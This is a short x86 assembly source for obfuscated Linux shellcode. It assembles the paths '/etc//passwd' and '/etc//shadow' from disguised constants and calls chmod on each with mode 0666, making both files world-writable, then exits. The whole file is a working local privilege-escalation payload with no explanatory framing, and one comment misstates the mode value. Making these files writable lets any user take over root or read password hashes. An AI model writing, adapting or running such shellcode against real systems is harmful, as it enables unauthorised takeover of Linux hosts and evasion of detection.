
global _start

section .text

_start:
	mov edi, 0x6374652f	; '/etc'
	jmp shellcode

chmod:
	mov al,0xf
	int 0x80		; syscall = 15 (chmod)
	xor eax, eax
	ret

shellcode:
	xor eax,eax
	mov ecx, 0xfffffe49
	not ecx			; 0x64777373 = not 0xfffffe49
	push eax
	mov edx, 0x01030E44
	add edx, edi		; 0x61702f2f = 0x01030E44 + 0x6374652f
	push edx
	mov edx, 0x1702f2f6
	ror edx, 4
	push edx
	push edi
	mov ebx,esp		; '/etc//passwd'
	call chmod

	push eax
	mov ebx, 0x141b014e
	xor ebx, edi		; 0x776f6461 = 0x141b014e xor 0x6374652f
	push ebx
	mov ebx, 0x978cd0d0
	not ebx			; 0x68732f2f = not 0x978cd0d0
	push ebx
	push edi
	mov ebx,esp		; '/etc//shadow'
	call chmod

	inc eax
	int 0x80		; syscall = 1 (exit)

